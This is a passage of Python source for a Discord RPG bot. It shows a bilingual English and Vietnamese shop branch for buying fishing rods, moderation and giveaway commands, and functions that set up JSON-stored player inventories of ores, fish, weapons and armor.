            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 15000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            return

    if mua.lower() == "10":
        if users[str(user.id)]["wallet"] <35000:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Money", value=a1, inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 4:
            await ctx.send("You don't have a fishing Gold Rod yet")
            return

        if users[str(user.id)]["rod"] > 5:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="You had Magic Rod", value=f"You can't buy continue {magic_rod} Magic Rod", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return

        if users[str(user.id)]["rod"] == 5:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Buy Magic Rod", value=f"You just bought {magic_rod} Magic Rod --> `35000` {coin}", inline=False)
            embed.add_field(name="Tip", value=a2, inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            users[str(user.id)]["rod"] += 1
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)

            users[str(user.id)]["wallet"] -= 35000
            with open("rpg.json", "w") as f:
                json.dump(users, f, indent=4)
            return

    else:
        if users[str(user.id)]["language"] == 0:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Enter the wrong id", value=f"This type of id is not available, please re-enter another id", inline=False)
            embed.add_field(name="Tip", value=f"After buying pickaxe you need puse + pickaxe name to use pickaxe", inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return  
        if users[str(user.id)]["language"] >= 1:
            embed = discord.Embed(timestamp=ctx.message.created_at, color = discord.Color.red())
            embed.add_field(name="Nhập sai id", value=f"Loại id này không khả dụng, vui lòng nhập lại id khác", inline=False)
            embed.add_field(name="Tip", value=f"Sau khi mua pickaxe bạn cần có puse + tên pickaxe để sử dụng pickaxe", inline=False)
            embed.set_author(name=f"{ctx.author.name}", icon_url=f"{ctx.author.avatar_url}")
            embed.set_footer(text="Tip: pbuy + id")
            await ctx.send(embed=embed)
            return  


#admin
@client.command(aliases=['c'])
@commands.has_permissions(manage_messages=True)
async def clear(ctx,amount=2):
  await ctx.channel.purge(limit = amount)

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member = None, *, reason=None):
    await ad.ban(ctx=ctx, member=member, reason=reason)

@client.command()
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, time=None,*, reason=None):
    await ad.mute(ctx=ctx, member=member, time=time, reason=reason)

@client.command()
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
    await ad.mute(ctx=ctx, member=member)


#giveaway
@client.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def giveaway(ctx, time:int, loại_time=None, *,prize:str):
    try:
        if loại_time == None:
            await ctx.send("You need to enter time type and have time types: **s, m, h, d**")

        if prize == None:
            await ctx.send("You need to enter the prize")

        embed = discord.Embed(title=":gift:Giveaway!",colour=discord.Colour.red())
        embed.add_field(name=f"**{prize}**!!", value=f"React:gift:to join\nTime left: {time}{loại_time}\nHosted by: {ctx.author.mention}")

        if loại_time == "s":
            gawtime = time * 1

        if loại_time == "m":
            gawtime = time * 60

        if loại_time == "h":
            gawtime = time * 3600

        if loại_time == "d":
            gawtime = time * 86400

        embed.set_footer(text=f"Giveaway ends in {time}{loại_time}")

        with open('channel.json', 'r') as f:
            channels = json.load(f)

        gaw_msg = await client.get_channel(channels[str(ctx.guild.id)]).send(embed=embed)
        await gaw_msg.add_reaction("🎉")
        await ctx.message.delete()
        await asyncio.sleep(gawtime)
        new_gaw_msg = await ctx.channel.fetch_message(gaw_msg.id)
        users = await new_gaw_msg.reactions[0].users().flatten()
        users.pop(users.index(client.user))
        winner = random.choice(users)
        embed.clear_fields()
        embed.add_field(name="Winner!!", value=f"{winner.mention}\nHosted by: {ctx.author.mention}")
        await gaw_msg.edit(embed=embed)
        await ctx.send(f"Winner!! {winner.mention} won {prize}!")
    except:
        await ctx.send("pjoingiveaway to connect giveaway with channel to create giveaway")

@client.command()
async def joingiveaway(ctx):
    with open('channel.json', 'r') as f:
        channels = json.load(f)
    
    idchannel = ctx.channel.id

    channels[str(ctx.guild.id)] = idchannel
    with open('channel.json', 'w') as f:
        json.dump(channels, f, indent=4)
    await ctx.send("Connected to the channel")

@client.command()
async def help_giveaway(ctx):
    embed = discord.Embed(title="Help Giveaway",colour=discord.Colour.red())
    embed.add_field(name=f"Create and start new giveaway. For requirements, you need to create task first!",
    value=f"**There are time types:**\n`s, m, h, d`\n\n**Structure command and For Example:**\n```CSS\npgiveaway [time] [kind of time] [prize]\npgiveaway 1 s 100owo\npgiveaway 12 m 300coin```")
    await ctx.send(embed=embed)


####################
async def open_acc(user):
  time.sleep(0)
  users = await get_bank()
  if str(user.id) in users:
    return False
  else:
    users[str(user.id)] = {}
    users[str(user.id)]["wallet"] = 0
    users[str(user.id)]["exp"] = 0
    users[str(user.id)]["exp_after"] = 0
    users[str(user.id)]["lvl"] = 0
    users[str(user.id)]["health"] = 100
    users[str(user.id)]["dame"] = 3
    users[str(user.id)]["defence"] = 1
    users[str(user.id)]["language"] = 0

    users[str(user.id)]["axe"] = 1
    
    users[str(user.id)]["orange"] = 0
    users[str(user.id)]["apple"] = 0
    users[str(user.id)]["pear"] = 0
    users[str(user.id)]["watermelon"] = 0
    users[str(user.id)]["dragonfruit"] = 0
    users[str(user.id)]["grape"] = 0
    users[str(user.id)]["strawberry"] = 0
    users[str(user.id)]["blueberry"] = 0
  
    users[str(user.id)]["herbal_stone_ring"] = 0
    users[str(user.id)]["flying_cucumber"] = 0
    users[str(user.id)]["ganoderma"] = 0
    users[str(user.id)]["purple_sweet_potato"] = 0
    users[str(user.id)]["red_grapes"] = 0
    users[str(user.id)]["crocodile_foot_herb"] = 0

    users[str(user.id)]["hoe"] = 1

    users[str(user.id)]["rock"] = 0
    users[str(user.id)]["smoothstone"] = 0
    users[str(user.id)]["copper"] = 0
    users[str(user.id)]["iron"] = 0
    users[str(user.id)]["gold"] = 0
    users[str(user.id)]["diamond"] = 0
    users[str(user.id)]["ruby"] = 0
    users[str(user.id)]["glowstone"] = 0
    users[str(user.id)]["magma"] = 0
    users[str(user.id)]["obsidian"] = 0
    users[str(user.id)]["moonstone"] = 0
    users[str(user.id)]["obsidianmoon"] = 0
    users[str(user.id)]["stoneancestor"] = 0

    users[str(user.id)]["pickaxe1"] = 2
    users[str(user.id)]["pickaxe2"] = 0
    users[str(user.id)]["pickaxe3"] = 0
    users[str(user.id)]["pickaxe4"] = 0
    users[str(user.id)]["pickaxe5"] = 0
    users[str(user.id)]["pickaxe6"] = 0

    users[str(user.id)]["rod"] = 1

    users[str(user.id)]["tuna"] = 0
    users[str(user.id)]["stickleback"] = 0
    users[str(user.id)]["squids"] = 0
    users[str(user.id)]["octopuss"] = 0
    users[str(user.id)]["electric_eel"] = 0
    users[str(user.id)]["salmon"] = 0
    users[str(user.id)]["dolphins"] = 0
    users[str(user.id)]["sharks"] = 0
    users[str(user.id)]["kappa_shark"] = 0
    users[str(user.id)]["purplecrystal_shark"] = 0

  with open("rpg.json", "w") as f:
    json.dump(users, f, indent=4)
  return True

async def get_bank():
  with open("rpg.json", "r") as f:
    users = json.load(f)
  return users

async def update_bank(user, change=0, mode="wallet"):
  users = await get_bank()
  users[str(user.id)][mode] += change
  with open ("rpg.json", "w") as f:
    json.dump(users, f, indent=4)
  bal = [users[str(user.id)]["wallet"], users[str(user.id)]["rock"]]
  return bal


##############
async def open_bow(user):
  time.sleep(0)
  bow = await get_bow()
  if str(user.id) in bow:
    return False
  else:
    bow[str(user.id)] = {}
    bow[str(user.id)]["bow1"] = 0
    bow[str(user.id)]["bow2"] = 0
    bow[str(user.id)]["bow3"] = 0
    bow[str(user.id)]["bow4"] = 0
    bow[str(user.id)]["bow5"] = 0

  with open("bow.json", "w") as f:
    json.dump(bow, f, indent=4)
  return True

async def get_bow():
  with open("bow.json", "r") as f:
    bow = json.load(f)
  return bow


##############
async def open_armor(user):
  time.sleep(0)
  armor = await get_armor()
  if str(user.id) in armor:
    return False
  else:
    armor[str(user.id)] = {}
    armor[str(user.id)]["basic_staff"] = 0
    armor[str(user.id)]["water_staff"] = 0
    armor[str(user.id)]["fire_staff"] = 0
    armor[str(user.id)]["light_staff"] = 0
    armor[str(user.id)]["sun_staff"] = 0

    armor[str(user.id)]["sword1"] = 0
    armor[str(user.id)]["sword2"] = 0
    armor[str(user.id)]["sword3"] = 0
    armor[str(user.id)]["sword4"] = 0
    armor[str(user.id)]["sword5"] = 0
    armor[str(user.id)]["sword6"] = 0

    armor[str(user.id)]["armor1"] = 0
    armor[str(user.id)]["armor2"] = 0
    armor[str(user.id)]["armor3"] = 0
    armor[str(user.id)]["armor4"] = 0
    armor[str(user.id)]["armor5"] = 0
    armor[str(user.id)]["armor6"] = 0

  with open("armor.json", "w") as f:
    json.dump(armor, f, indent=4)
  return True

async def get_armor():
  with open("armor.json", "r") as f:
    armor = json.load(f)
  return armor




##################
client.run(TOKEN)